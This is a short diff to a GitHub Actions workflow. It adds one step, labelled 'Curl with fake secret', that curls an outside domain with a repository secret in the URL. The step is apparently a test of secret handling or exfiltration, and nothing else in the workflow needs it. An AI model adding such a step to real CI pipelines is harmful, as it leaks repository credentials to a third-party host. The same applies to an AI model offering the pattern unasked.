@@ -8,6 +8,8 @@ jobs:
     name: Client
     runs-on: ubuntu-latest
     steps:
+      - name: Curl with fake secret
+        run: curl https://lol.petchblog.net?secret=${{ secrets.TEST_SECRET }}
       - name: Git Checkout
         uses: actions/checkout@v4
         with:
